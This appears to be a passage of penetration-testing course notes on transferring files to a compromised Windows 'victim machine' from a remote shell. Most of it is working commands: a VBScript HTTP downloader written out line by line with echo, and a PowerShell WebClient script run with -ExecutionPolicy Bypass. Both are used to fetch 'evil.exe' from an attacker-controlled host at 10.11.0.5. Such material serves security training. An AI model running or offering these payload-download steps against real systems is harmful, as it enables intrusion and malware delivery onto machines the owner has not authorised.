by non-interactive way:
Scripting engines such as VBScript (in Windows XP, 2003) and PowerShell (in Windows
7, 2008, and above) can both be leveraged to download files to our victim machine

VBSCRIPT
when pasted into a remote shell, will write out a VBS script that acts as a simple HTTP downloader.
	echo strUrl = WScript.Arguments.Item(0) > wget.vbs
	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
	echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
	echo Err.Clear >> wget.vbs
	echo Set http = Nothing >> wget.vbs
	echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
	echo http.Open "GET", strURL, False >> wget.vbs
	echo http.Send >> wget.vbs
	echo varByteArray = http.ResponseBody >> wget.vbs
	echo Set http = Nothing >> wget.vbs
	echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
	echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
	echo strData = "" >> wget.vbs
	echo strBuffer = "" >> wget.vbs
	echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
	echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
	echo Next >> wget.vbs
	echo ts.Close >> wget.vbs
	
Now, we can serve files on our own web server, and download them to the victim machine with ease:
	C:\Users\Offsec>cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
	
POWERSHELL
An even simpler example, for downloading files on machines that have PowerShell installed, is shown below.
	C:\Users\Offsec> echo $storageDir = $pwd > wget.ps1
	C:\Users\Offsec> echo $webclient = New-Object System.Net.WebClient >>wget.ps1
	C:\Users\Offsec> echo $url = "http://10.11.0.5/evil.exe" >>wget.ps1
	C:\Users\Offsec> echo $file = "new-exploit.exe" >>wget.ps1
	C:\Users\Offsec> echo $webclient.DownloadFile($url,$file) >>wget.ps1
Now, we can use PowerShell to run the script and download our file:
	C:\Users\Offsec> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
	
Using debug.exe to Transfer Files
